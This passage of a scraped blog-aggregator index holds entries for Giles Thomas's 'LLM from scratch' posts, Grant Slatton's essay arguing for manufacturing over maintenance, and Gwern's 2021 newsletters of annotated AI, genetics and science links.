next?","text":"<p>\u94fe\u63a5: https://www.gilesthomas.com/2025/11/llm-from-scratch-27-whats-left-and-whats-next</p> <p>\u65e5\u671f: Tue, 04 Nov 2025 00:40:00 +0000</p> <p>\u6458\u8981: On 22 December 2024, I wrote : Over the Christmas break (and probably beyond) I'm planning to work through Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \". I'm expecting to g...</p>"},{"location":"gilesthomas.com/#3-why-smart-instruction-following-makes-prompt-injection-easier","title":"3. Why smart instruction-following makes prompt injection easier","text":"<p>\u94fe\u63a5: https://www.gilesthomas.com/2025/11/smart-instruction-following-and-prompt-injection</p> <p>\u65e5\u671f: Wed, 12 Nov 2025 19:00:00 +0000</p> <p>\u6458\u8981: Back when I first started looking into LLMs , I noticed that I could use what I've since called the transcript hack to get LLMs to work as chatbots without specific fine-tuning. It's occurred to me th...</p>"},{"location":"gilesthomas.com/#4-writing-an-llm-from-scratch-part-28-training-a-base-model-from-scratch-on-an-rtx-3090","title":"4. Writing an LLM from scratch, part 28 -- training a base model from scratch on an RTX 3090","text":"<p>\u94fe\u63a5: https://www.gilesthomas.com/2025/12/llm-from-scratch-28-training-a-base-model-from-scratch</p> <p>\u65e5\u671f: Tue, 02 Dec 2025 18:15:00 +0000</p> <p>\u6458\u8981: Having worked through the main body of Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \", I wanted to try an experiment: is it possible to train a base model of my own, on my o...</p>"},{"location":"gilesthomas.com/#5-writing-an-llm-from-scratch-part-29-using-distributeddataparallel-to-train-a-base-model-from-scratch-in-the-cloud","title":"5. Writing an LLM from scratch, part 29 -- using DistributedDataParallel to train a base model from scratch in the cloud","text":"<p>\u94fe\u63a5: https://www.gilesthomas.com/2026/01/llm-from-scratch-29-ddp-training-a-base-model-in-the-cloud</p> <p>\u65e5\u671f: Wed, 07 Jan 2026 20:40:00 +0000</p> <p>\u6458\u8981: I'm carrying on with my \"extra credit\" projects after finishing the main body of Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \". Having proven that I could train a GPT-2 sma...</p>"},{"location":"gilesthomas.com/01_Writing_an_LLM_from_scratch__part_26_--_evaluating/","title":"Writing an LLM from scratch, part 26 -- evaluating the fine-tuned model","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.gilesthomas.com/2025/11/llm-from-scratch-26-evaluating-the-fine-tuned-model \u53d1\u5e03\u65e5\u671f: Mon, 03 Nov 2025 19:40:00 +0000</p> <p>This post is on the second half of chapter 7 of Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \". In the last post I covered the part of the chapter that covers instruction fi...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"gilesthomas.com/02_Writing_an_LLM_from_scratch__part_27_--_what_s_lef/","title":"Writing an LLM from scratch, part 27 -- what's left, and what's next?","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.gilesthomas.com/2025/11/llm-from-scratch-27-whats-left-and-whats-next \u53d1\u5e03\u65e5\u671f: Tue, 04 Nov 2025 00:40:00 +0000</p> <p>On 22 December 2024, I wrote : Over the Christmas break (and probably beyond) I'm planning to work through Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \". I'm expecting to g...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"gilesthomas.com/03_Why_smart_instruction-following_makes_prompt_injec/","title":"Why smart instruction-following makes prompt injection easier","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.gilesthomas.com/2025/11/smart-instruction-following-and-prompt-injection \u53d1\u5e03\u65e5\u671f: Wed, 12 Nov 2025 19:00:00 +0000</p> <p>Back when I first started looking into LLMs , I noticed that I could use what I've since called the transcript hack to get LLMs to work as chatbots without specific fine-tuning. It's occurred to me th...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"gilesthomas.com/04_Writing_an_LLM_from_scratch__part_28_--_training_a/","title":"Writing an LLM from scratch, part 28 -- training a base model from scratch on an RTX 3090","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.gilesthomas.com/2025/12/llm-from-scratch-28-training-a-base-model-from-scratch \u53d1\u5e03\u65e5\u671f: Tue, 02 Dec 2025 18:15:00 +0000</p> <p>Having worked through the main body of Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \", I wanted to try an experiment: is it possible to train a base model of my own, on my o...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"gilesthomas.com/05_Writing_an_LLM_from_scratch__part_29_--_using_Dist/","title":"Writing an LLM from scratch, part 29 -- using DistributedDataParallel to train a base model from scratch in the cloud","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.gilesthomas.com/2026/01/llm-from-scratch-29-ddp-training-a-base-model-in-the-cloud \u53d1\u5e03\u65e5\u671f: Wed, 07 Jan 2026 20:40:00 +0000</p> <p>I'm carrying on with my \"extra credit\" projects after finishing the main body of Sebastian Raschka 's book \" Build a Large Language Model (from Scratch) \". Having proven that I could train a GPT-2 sma...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"grantslatton.com/","title":"grantslatton.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Manufacturing as Maintenance 20260131</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"grantslatton.com/Manufacturing%20as%20Maintenance_20260131/","title":"Manufacturing as MaintenanceManufacturing as Maintenance","text":"<p>\u6765\u6e90: grantslatton.com \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 21:56:41 +0000 \u94fe\u63a5: https://grantslatton.com/manufacturing-as-maintenance</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://grantslatton.com/rss.xml', 'value': '\\n<p>The maintenance spectrum has two ends.</p>\\n<p>At one end, an object is lovingly maintained with effort and care through the years. A cherished blade sharpened on a whetstone every few months.</p>\\n<p>At the other end, we have manufacturing: just toss the dull knife into the smelter at one end of a factory, and out the other end comes a beautiful, perfect, factory-sharp replacement.</p>\\n<p>The former garners respect. And it\\'s easy to see why: frequent maintenance was requisite for civilization until the Industrial Revolution. When a suit of armor took months of skilled labor to produce, you\\'d better maintain it well.</p>\\n<p>So our culture developed in a world where maintenance has a quasi-moral component and is nearly synonymous with virtue.</p>\\n<p>My own aesthetic preference is the opposite. Maintenance is tedium. It\\'s using up valuable mental real estate perpetually juggling the upkeep status of all the objects in my life.</p>\\n<p>The modal reaction to this preference is mild revulsion. Our culture has inculcated in us the morality of thrifty maintenance.</p>\\n<p>I propose the opposite: the amount of precious time and effort spent on maintenance is a disgusting waste of human potential.</p>\\n<p>We should view the need for maintenance as a historical burden to be shrugged off, just as we\\'ve shrugged off the need for most people to participate in back-breaking agriculture.</p>\\n<p>The most common reason people give for preferring maintenance over manufacturing is wastefulness. Re-forging a knife is wasteful. But what\\'s being wasted?</p>\\n<p>The metal is not destroyed or transmuted into some lesser element. The only \"waste\" is the energy needed to melt my dull knife and cast it into a new, sharp one. In our industrial age, this is only a few cents\\' worth of energy.</p>\\n<p>And in our industrial age, the cheapest energy is bountiful, clean solar.</p>\\n<p>Rather than spending 10 minutes sharpening a knife on a whetstone, you\\'d be better off spending 10 minutes making solar panels, and then using those solar panels to melt and reforge your old knife.</p>\\n<p>A market economy, of course, intermediates all this, but the thought experiment is still a useful way to show how our inherited intuitions on alleged wastefulness are wrong.</p>\\n<p>There are more benefits to manufacturing as maintenance.</p>\\n<p>Rebirth is a cleansing fire. Rebirth is a chance to start anew. With continual re-making, we get better at making.</p>\\n<p>How much better would home construction be if we rebuilt every 10 years instead of every 50?</p>\\n<p>We\\'d have 5x the societal experience. Every homebuilder could be a master of his craft in 5 years instead of 25.</p>\\n<p>Homes would never be long out of date. No knob-and-tube wiring to contend with. No lead pipes. A home built in the 2000s would have Ethernet cable running throughout. And one in the 2010s would have a WiFi mesh in the walls.</p>\\n<p>Homes would transform to grow with families. A starter home in your 20s. A home for kids in your 30s, and a different one for teens in your 40s. Then another for empty-nesters in their 50s.</p>\\n<p>We\\'d build them much faster and cheaper. What shortcuts and simplifications can you make if you know you\\'ll tear it down 10 years later? How would society change when a home costs only a few months\\' salary, and could be built in a month?</p>\\n<p>We are headed this way.</p>\\n<p>People increasingly don\\'t maintain modular desktop computers whose parts can be upgraded piecemeal. They buy a brand new maintenance-free laptop every 5 years.</p>\\n<p>Electric cars, too, require very little maintenance, and aren\\'t likely to join the ranks of classic cars people lovingly maintain for a half-century.</p>\\n<p>Homes, too, will be swept up in this.</p>\\n<p>Industrial production of homes has existed for decades, but only at the low end: manufactured mobile homes designed for trailer parks or rural plots.</p>\\n<p>But a few startups are succeeding at industrial production of homes. Cover, for example, builds luxury homes in record time.</p>\\n<p>Even without producing components in a factory like Cover, technologies such as humanoid robotics would get us there anyway. Imagine a squad of fifty humanoid robots descending on a homebuilding site, working 24/7 with inhumanly perfect coordination and plan-adherence. They\\'d finish in days.</p>\\n<p>I\\'m reminded of Ise Jing\u016b, a Shint\u014d shrine that is ceremonially rebuilt every 20 years.</p>\\n<p>It\\'s a manifestation of the concept of tokowaka (\u5e38\u82e5). The word literally means \"ever-young\". It\\'s the idea that vitality is preserved with periodic renewal.</p>\\n<p>The direction of industrial society is toward ubiquitous tokowaka. We should throw off our fetishization of maintenance and actively work towards this.</p>\\n\\n<p>A quick postscript on pollution: modern chemistry has enabled the creation of materials that are not readily renewed with energy alone.</p>\\n<p>Such products are popular in large part because they are so low-maintenance, but that chemical durability results in pollution.</p>\\n<p>By embracing manufacturing-as-maintenance of products made of recyclable materials like metal and wood, we can draw people away from such polluting materials.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"gwern.net/","title":"gwern.net\\n\\n\u7f51\u7ad9: https://gwern.net\\nRSS: https://gwern.substack.com/feed\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- May 2021 Gwern.net Newsletter_20260205\\n- April 2021 newsletter_20260205\\n- March 2021 Gwern.net Newsletter_20260205\\n- February 2021 Gwern.net Newsletter_20260205\\n- Jan 2021 Gwern.net Newsletter_20260205\\n","text":""},{"location":"gwern.net/April%202021%20newsletter_20260205/","title":"April 2021 newsletter\\n\\n\u6765\u6e90: https://gwern.net\\n\u94fe\u63a5: https://gwern.substack.com/p/april-2021-newsletter\\n\u65e5\u671f: Thu, 03 Jun 2021 15:45:24 GMT\\n\\n---\\n\\nApril 2021\u2019s\\nGwern.net\\nnewsletter\\nis now out; previous,\\nMarch 2021\\n(\\narchives\\n). This is a collation of links and summary of major changes, overlapping with my\\nChangelog\\n; brought to you by my donors on\\nPatreon\\n.\\n1 Writings\\nBetter Greek Variable Suggestions\\n(use \u03f0, \u03c2, \u03c5, \u03d6, \u03a5, \u039e, \u03b9, \u03f1, \u03d1, or \u03a0 instead)\\n2 Links\\n2.1 AI\\n\u201cSet Transformer: A Framework for Attention-based Permutation-Invariant Neural Networks\u201d\\n, Lee et al 2018;\\n\u201cPerceiver: General Perception with Iterative Attention\u201d\\n, Jaegle et al 2021 (skinny Transformers applied recurrently; given reinvention, one might ask \u201cis\\nattention\\n, getting too much attention?\u201d, especially given how many Transformer tweaks\\ndon\u2019t pan out\\nor have antecedents, indicating a gold rush? Probably not: if the  marginal return on this research direction had fallen below that of  competitors, we would see those neglected directions invade Transformer  topics\u2014while we continue to see the reverse, and many applications as  yet untouched by all the new approaches, suggesting that we\\nstill\\ndon\u2019t pay enough attention)\\n\u201cZ-IL: Predictive Coding Can Do Exact Backpropagation on Any Neural Network\u201d\\n, Salvatori et al 2021 (scaling local learning rules to ImageNet AlexNet/Resnet &amp; ALE DRL at similar compute cost)\\n\u201cSuper-Convergence: Very Fast Training of Neural Networks Using Large Learning Rates\u201d\\n,  Smith &amp; Topin 2017 (the lingering mystery of super-convergence,  saving 50\u201390% compute with LRs as high as 20 (!): what is it, why does  it work only sometimes, is there any connection to\\ngrokking\\n&amp; can it work for large models like GPT-3 given the\\ntunneling hypothesis\\n?)\\n\u201cRip van Winkle\u2019s Razor, a Simple New Estimate for Adaptive Data Analysis\u201d\\n(an unusual approach to estimating generalization\u2014by quantifying the  information-theoretic simplicity of all the powerful DL research  discoveries since 2012, into ~1 kilobyte. And yet,\\nwhat\\na kilobyte\u2026)\\n\u201cAmbigrammatic Figures\u201d\\n, Levin &amp; Huang 2020 (making horrifying StyleGAN faces that can be\\nrotated 180\u00b0\\nby projection &amp; then\\ngradient-ascent\\ntowards an upside-down face)\\nMatters Of Scale\\n:\\nLarge Models\\n:\\nCongratulations to OpenAI on 1 year of GPT-3 &amp; OA API. Has it really only been a year?\u2014it has truly exceeded expectations.\\nNaver\\nannounces 204b-parameter Korean-language NN,\\n\u201cHyperCLOVA\u201d\\n(KO; unknown arch although apparently dense, or training-compute or  benchmark/loss performance; 650b token training dataset. Who knew Naver  was even trying? \u201cAnd we are here as on a darkling plain / Swept with  confused alarms of struggle and flight, / Where ignorant armies clash by  night.\u201d)\\n\u201cPanGu-\u03b1: Large-scale Autoregressive Pretrained Chinese Language Models with Auto-parallel Computation\u201d\\n,  Zeng et al 2021 (Zh; Huawei\u2019s GPT-3-200b prototype, trained on  indigenous Chinese GPU+DL stack; a partial replication, due to  incomplete training on ~43b tokens; the\\n13b-parameter\\nmodel checkpoint has been released for download, and they are considering releasing the 200b-parameter model\u2026\\nDing commentary\\n)\\nNew \ud835\udcaa(100b)-parameter Transformer models announced at Google I/O \u20192021:\\nLaMDA\\n(EN; chatbot),\\nMUM\\n(multimodal multilingual search/translation/Q&amp;A)\\n\u201cPLUG\u201d\\n(Zh): a 27b parameter BERT-like Chinese language model, targeting 200b next (AliBaba followup to\\nStructBERT\\n/\\nPALM\\n)\\n\u201cCogView: Mastering Text-to-Image Generation via Transformers\u201d\\n, Ding et al 2021 (another Chinese\\nDALL\u00b7E\\nclone, post-\\nM6\\n:\\nn\\n=\\n30m text-image pairs\\n, 4b-parameter GPT, models to be released)\\n\u201cVideoGPT: Video Generation using VQ-VAE and Transformers\u201d\\n, Yan et al 2021;\\n\u201cGODIVA:\\nG\\nenerating\\nO\\npen-\\nD\\noma\\nI\\nn\\nV\\nideos from n\\nA\\ntural Descriptions\u201d\\n, Wu et al 2021 (DALL\u00b7E for video on Howto100M:\\nVQ-VAE\\n+ sparse attention)\\n\u201cEfficient Large-Scale Language Model Training on GPU Clusters\u201d\\n, Narayanan et al 2021 (Nvidia\\n\u2018Megatron-LM\u2019 software\\nfor scaling up to 3072 A100 GPUs; allows 1t-parameter models at 502 petaFLOP/s or 50% efficiency, cf TPU rival,\\nGSPMD\\n, and note\\nPatterson et al 2021\\nestimates GPT-3 at ~3.5m V100 GPU-hours, so OA got ~20% efficiency?);\\n\u201cWe expect to see multi-trillion-parameter models by next year, and 100 trillion+ parameter models by 2023\u201d\\n\u2014Nvidia CEO\\nJensen Huang\\n(\\nsubtitles\\n)\\nMixture-Of-Experts:\\nBAAI\u2019s \u201cWudao Wensu\u201d: 1.75-trillion parameters &amp; multimodal!\\n(\\nprologue\\n)\\n\u201cExploring Sparse Expert Models and Beyond\u201d\\n, Yang et al 2021 (1t-parameter hierarchical Switch Transformer trained on 480 V100 GPUs)\\nMuZero\\n:\\n\u201cMuZero Unplugged: Online and Offline Reinforcement Learning by Planning with a Learned Model\u201d\\n, Schrittwieser et al 2021 (Reanalyze+MuZero;\\nsmooth log-scaling\\nof\\nMs.\u00a0Pacman\\nreward with sample size, 107\u20131010, showing that DRL for arcade games parallels board games)\\n\u201cDecision Transformer: Reinforcement Learning via Sequence Modeling\u201d\\n, Chen et al 2021\\n\u201cSampled MuZero: Learning and Planning in Complex Action Spaces\u201d\\n, Hubert et al 2021 (MuZero for continuous domains: DM Control Suite/Real-World RL Suite);\\n\u201cContinuous Control for Searching and Planning with a Learned Model\u201d\\n, Yang et al 2020\\n\u201cMuesli: Combining Improvements in Policy Optimization\u201d\\n, Hessel et al 2020 (catching up with original MuZero)\\n\u201cVisualizing MuZero Models\u201d\\n, de Vries et al 2021 (reimplementing &amp; introspecting a MuZero)\\n\u201cScaling Scaling Laws with Board Games\u201d\\n,\\nJones\\n2021 (AlphaZero/\\nHex\\n:\\nhighly-optimized\\nGPU implementation enables showing\\nsmooth scaling\\nacross 6 OOM of compute\u20142\u00d7 FLOPS = 66% victory; amortization of  training \u2192 runtime tree-search, where 10\u00d7 training = 15\u00d7 runtime)\\n\u201cScaling Laws for Language Transfer Learning\u201d\\n, Christina Kim (\\nHernandez et al 2021\\nfollowup: smooth scaling for En \u2192 De/Es/Zh)\\n\u201cCarbon Emissions and Large Neural Network Training\u201d\\n,  Patterson et al 2021 (\u201c\u2026choice of DNN/datacenter/processor can reduce  the carbon footprint up to ~100\u20131000\u00d7. These large factors make  retroactive estimates difficult.\u201d)\\n\u201cHow to Train BERT with an Academic Budget\u201d\\n, Izsak et al 2021 (\\nBERT\\nin 8 GPU-days\u2014R&amp;D iteration allows finding efficiency; there\u2019s nothing so expensive as demanding research be cheap.^1^)\\n2.2 Genetics\\nEverything Is Heritable:\\n\u201cPrecision exercise medicine: understanding exercise response variability\u201d\\n,  Ross et al 2019 (\u201clarge individual differences in CRF response (range:  \u221233% to +118%) have been observed across the 8 exercise training studies  independent of exercise duration\u201d\u2014nothing in psychology, or medicine,  makes sense except in the light of individual differences\u2026)\\nRecent Evolution:\\n\u201cAnalysis of genomic DNA from medieval plague victims suggests long-term effect of\\nYersinia pestis\\non human immunity genes\u201d\\n, Immel et al 2021\\nEngineering:\\n\u201cChina officially bans CRISPR babies, human clones and animal-human hybrids\u201d\\n? (another blow to attempts to project fears &amp; fantasies onto China)\\n2.3 Politics/Religion\\nReflecting Sunlight: Recommendations for Solar Geoengineering Research and Research Governance\\n, National Academies 2021 (\\nmedia\\n)\\n\u201cImproving Public Sector Management at Scale? Experimental Evidence on School Governance India\u201d\\n, Muralidharan &amp; Singh 2020\\n\u201cJay-Z\u2019s\\n99 Problems\\n, Verse 2: A Close Reading with 4th Amendment Guidance for Cops and Perps\u201d\\n, Mason 2012\\n2.4 Psychology/Biology\\n\u201cOxylipin biosynthesis reinforces cellular senescence and allows detection of senolysis\u201d\\n, Wiley et al 2021\\n\u201cInside the Secret Sting Operations to Expose Celebrity Psychics\u201d\\n\u201cIf I fits I sits: A citizen science investigation into illusory contour susceptibility in domestic cats (\\nFelis silvestris catus\\n)\u201d\\n, Smith et al 2021\\n\u201cCetaceans,  sex and sea serpents: an analysis of the Egede accounts of a \u2018most  dreadful monster\u2019 seen off the coast of Greenland in 1734\u201d\\n, Paxton et al 2005 (is that a legendary cryptid in your pocket, or are you just happy to see me?)\\n\u201cBuilding the perfect curse word: A psycholinguistic investigation of the form and meaning of taboo words\u201d\\n, Reilly et al 2020\\nTarrare\\n2.5 Technology\\n\u201cHow Developers Choose Names\u201d\\n,  Feitelson et al 2021 (\u201cAnother example concerned the function  \u2018arrangeFilesByName(files)\u2019. When asked the return value\u2026one suggested  the number of files reordered\u201d)\\n\u201cBringing GNU Emacs to Native Code\u201d\\n,  Corallo et al 2020 (using libgccjit to make Emacs 2.3\u00d7 to 42\u00d7 faster;  gccemacs has been merged into Emacs HEAD &amp; will be available soon)\\n\u201cHosting SQLite databases on Github Pages (or any static file hoster)\u201d\\n(a revolution in static website technology: eg running a query\\nneed download only 54kb of a 670MB database\\n; fulltext site search is just the beginning of the possibilities of this clever use of\\nrange requests\\n)\\n\u201c\\nFontemon\\n: World\u2019s first video game in a font!\u201d\\n(a\\nPokemon\\n-like CYOA\\nimplemented as an OpenType font file\\n; play in browser or text editor\u2014still not quite\\nTuring-complete\\nbut definitely the most impressive thing implemented in a font so far)\\nFontemon\\nis by far the highlight of\\nSIGBOVIK 2021\\n; but also worth noting:\\n\u201cBack to Square One: Superhuman Performance in Chutes and Ladders Through Deep Neural Networks and Tree Search\u201d\\n\u00b7\\n\u201cDeep Deterministic Policy Gradient Boosted Decision Trees\u201d\\n\u00b7\\n\u201cLowestcase and uppestcase letters: Advances in derp learning\u201d\\n\u00b7\\n\u201copenCHEAT: Computationally Helped Error bar Approximation Tool\u2014Kick-starting Science 4.0\u201d\\n\u00b7\\n\u201cThe Newcomb-Benford Law, Applied to Binary Data: An Empirical and Theoretic Analysis\u201d\\n\u00b7\\n\u201cInverted Code Theory: Manipulating Program Entropy\u201d\\n(\\nTenet\\nfans only\u2014possibly inferior to\\nMoravec 1991\\n?) \u00b7\\n\u201cBuild your own 8-bit busy beaver on a breadboard!\u201d\\nIncidentally, it\u2019s curious that while STEM fields have entire annual issues, journals, &amp; conferences devoted to satire (\\nSIGBOVIK\\n; Arxiv April Fools papers like\\nGarfinkel et al 2017\\n;\\nSpecial Topics\\n; the\\nBMJ Christmas issue\\n; the\\nIg Nobel Prizes\\n&amp;\\nBAHFest\\n), after asking in several places, I have found no instances in the humanities. (I know of many entertaining\\npapers\\n, like\\nSinhababu 2008\\non waifus, but no\\nregular organized\\npublication, with the possible exception of the annual\\n\u201cLatke-Hamantash Debate\u201d\\n.)\\n2.6 Economics\\n\u201cThe Kelly Criterion in Blackjack Sports Betting, and the Stock Market\u201d\\n, Thorp 2006\\n\u201cThe Performance Pay Nobel\u201d\\n(CEO pay as\\nblackbox optimization problem\\n)\\n\u201cThe Ocean\u2019s Hot Dog: The Development of the Fish Stick\u201d\\n,  Kelly 2008 (out of nostalgia, I bought some fish sticks for the first  time in decades; better than I remembered, even if I had no\\ntartar\\nhandy)\\n2.7 Philosophy\\n\u201cThe Aesthetics of Smelly Art\u201d\\n, Shiner &amp; Kriskovets 2007;\\n\u201cThe Odor Value Concept in the Formal Analysis of Olfactory Art\u201d\\n, Kraft 2019;\\n\u201cPerfumery as an art form\u201d\\n/\\nnotes\\n, Qualia Computing 2020 (more: manufacturing:\\n\u201cThe Scent of the Nile: Jean-Claude Ellena creates a new perfume\u201d\\n; human smell is better than you think:\\n\u201cMechanisms of Scent-tracking in Humans\u201d\\n, Porter et al 2006 (\\nvideo\\n; see also\\n\u201cPoor Human Olfaction is a 19th Century Myth\u201d\\n, McGann 2017);\\nolfactory white\\n;\\nK\u014dd\u014d\\n, which unexpectedly appears in\\nKnuth\\n.\\nC. Thi Nguyen\\n\u2019s description of the more bizarre &amp; avant-garde perfumes made me curious enough to nose around &amp; order 39\\nLuckyScent\\nsamplers.)\\n2.8 Miscellaneous\\nBog butter\\nSarah Bernhardt\\n(Lions. Lots of lions.)\\nAnother thought, looking at\\n\u2018Employer Costs for Employee Compensation\u2019\\n(\\nPDF\\n):\\n\u201cMoore\u2019s Law\u201d: the cost of a transistor halves every ~19 months;\\n\u201cAnti-Moore\u2019s Law\u201d: the cost of a synapse doubles every ~119 years.","text":""},{"location":"gwern.net/February%202021%20Gwern.net%20Newsletter_20260205/","title":"February 2021 Gwern.net Newsletter\\n\\n\u6765\u6e90: https://gwern.net\\n\u94fe\u63a5: https://gwern.substack.com/p/february-2021-gwernnet-newsletter\\n\u65e5\u671f: Sat, 13 Mar 2021 15:18:44 GMT\\n\\n---\\n\\nFebruary 2021\u2019s\\nGwern.net\\nnewsletter\\nis now out; previous,\\nJanuary 2021\\n(\\narchives\\n). This is a summary of the revision-history RSS feed, overlapping with my\\nChangelog\\n&amp;\\n/r/gwern\\n; brought to you by my donors on\\nPatreon\\n.\\n1 Writings\\nGwern.net\\n: popups: can now be moved, stickied, and full-screened (another step towards our ambition of Windows-95-in-the-browser!)\\n2 Links\\n2.1 AI\\n\u201cControllable Neural Text Generation\u201d\\n, Lilian Weng;\\n\u201cRecent Advances in Language Model Fine-tuning\u201d\\n, Sebastian Ruder (review)\\n\u201cPrompt Programming for Large Language Models: Beyond the Few-Shot Paradigm\u201d\\n,  Reynolds &amp; McDonell 2021 (original 10-shot Fr \u2192 En translation can  be beaten by the better 0-shot prompt: \u201cFrench: XYZ / English:\u2026\u201d; this  is \u201ctrue of most worst-performing prompts\u2026\u201d);\\n\u201cCalibrate Before Use: Improving Few-Shot Performance of Language Models\u201d\\n, Zhao et al 2021 (huge boost from calibrating unstable prompts; both demonstrate,\\nas always\\n, that \u201csampling can prove the presence of knowledge but not the absence.\u201d)\\n\u201cTransGAN: Two Transformers Can Make One Strong GAN\u201d\\n, Jiang et al 2021 (Transformer-only GAN: attention is all you need)\\n\u201cPACT: Proof Artifact Co-training for Theorem Proving with Language Models\u201d\\n, Han et al 2021 (\\nGPT-f\\nfor\\nLean\\n)\\n\u201cTowards End-to-End In-Image Neural Machine Translation\u201d\\n, Mansimov et al 2020 (sure why not)\\nBrains\\n:\\n\u201cArtificial Neural Nets Finally Yield Clues to How Brains Learn\u201d\\n(short overview of biologically-plausible backprop: feedback alignment,  target propagation, predictive coding, &amp; attentional feedback; also  of recent interest,\\nVS-ML\\n;  given their increasing success in training while respecting more  biological constraints, the increasing power of backprop-trained ANNs  and the neurological success of ANNs in predicting &amp; imitating brain  signals, it is increasingly clear that brains\\nreally do\\ndo backprop in some sense)\\n\u201cNSD: A massive 7-tesla fMRI dataset to bridge cognitive and computational neuroscience\u201d\\n,  Jean et al 2021 (\u201c\u2026The availability of NSD thus opens the door to using  brain activity to directly guide the optimization of deep neural  networks.\u201d)\\n\u201cBrain2Pix: Fully convolutional naturalistic video reconstruction from brain activity\u201d\\n, Le et al 2021 (reconstructing\\nDr.\u00a0Who\\n)\\n\u201cHigh-performance brain-to-text communication via imagined handwriting\u201d\\n, Willett et al 2020\\n\u201cBrain-computer interface for generating personally attractive images\u201d\\n, Spape et al 2021 (many ways to improve this\u2026)\\nMatters Of Scale\\n:\\n\u201cScaling Laws for Transfer\u201d\\n,  Hernandez et al 2021 (\u201cWe find that pre-training effectively multiplies  the fine-tuning dataset size\u201d; a shot across the bow of anyone floating  on a proprietary-dataset moat: large models can drop data requirements  by orders of magnitude overnight, even surpassing you)\\n\u201cALIGN: Scaling Up Visual and Vision-Language Representation Learning With Noisy Text Supervision\u201d\\n, Jia et al 2021 (see also\\nCC-12M\\n;\\nCLIP\\n-like w/EfficientNet trained on 1.8 billion images on a TPUv3-1024\u2014\\nDM\\nargues that fancier cross-modal Transformers are better, nevertheless,\\n\u2018TPUs go brrr\u2019\\n. Given DALL\u00b7E, CLIP, ALIGN,\\nVDVAE\\n,\\nCW-VAE\\n,\\nAIPO\\net al, are GANs already dead, and just don\u2019t realize it yet? Or at  least soon to be relegated to only DRL-like uses as a final finetuning  phase to sharpen up a self-supervised model?);\\n\u201cWenLan: Bridging Vision and Language by Large-Scale Multi-Modal Pre-Training\u201d\\n, Huo et al 2021\\n\u201cDALL\u00b7E: Zero-Shot Text-to-Image Generation\u201d\\n, Ramesh et al 2021 (\\noriginal blog\\n);\\n\u201cM6: A Chinese Multimodal Pretrainer\u201d\\n,  Lin et al 2021 (Chinese DALL\u00b7E: 1.9TB images/0.29TB text for  10b-parameter dense/100b-parameter MoE Transformer; shockingly fast Chinese replication of DALL\u00b7E/CLIP)\\n\u201cExplaining Neural Scaling Laws\u201d\\n, Bahri et al 2021/\\n\u201cLearning Curve Theory\u201d\\n, Hutter 2021 (\\nRohin Shah commentary\\n; more on the manifold hypothesis)\\n2.2 Genetics\\nEverything Is Heritable:\\n\u201cPhenotypic covariance across the entire spectrum of relatedness for 86 billion pairs of individuals\u201d\\n, Kemper et al 2021\\n\u201cGenetic variation, brain, and intelligence differences\u201d\\n, Deary et al 2021\\n\u201cPathfinder: A gamified measure to integrate general cognitive ability into the biological, medical and behavioural sciences\u201d\\n, Malanchini et al 2021 (not the focus, but the IQ PGS is a slight improvement over\\nAllegrini et al 2018\\ndue to less phenotype measurement error?)\\n\u201cPolygenic  burden has broader impact on health, cognition, and socioeconomic  outcomes than most rare and high-risk copy number variants\u201d\\n, Saarentaus et al 2021\\nOn candidate-genes &amp; COMT\\nRecent Evolution:\\n\u201cMillion-Year-Old  DNA Rewrites the Mammoth Family Tree: Genomic data\u2014the oldest ever  recovered from a fossil\u2014reveals the origin and evolution of the  Columbian mammoth\u201d\\n\u201cKin selection explains the evolution of cooperation in the gut microbiota\u201d\\n, Simonet &amp; McNally 2021\\nEngineering:\\nFirst Black-Footed Ferret cloned\\n2.3 Statistics/Meta-Science\\n\u201cLessons from Gerolamo Cardano\u2019s\\nThe Book of My Life\\n\u201d\\n(progress studies; see also\\nNewton\u2019s anthropic argument\\n,\\nBakewell &amp; inventing progress\\n,\\nThe Autobiography of Benvenuto Cellini\\n)\\n\u201cHow Many Microcovids Would You Spend on a Burrito?\u201d\\n(on the\\nmicroCOVID Project Calculator\\n)\\n\u201cOn  the enfeeblement of mathematical skills by \u2018Modern Mathematics\u2019 and by  similar soft intellectual trash in schools and universities\u201d\\n, Hammersley 1968 (\\nKnuth\\nhighlights as also amusing:\\n\u201cA Note on Piffles\u201d\\n, Smith 1967;\\n\u201cA rebuke of A. B. Smith\u2019s paper, \u2018A 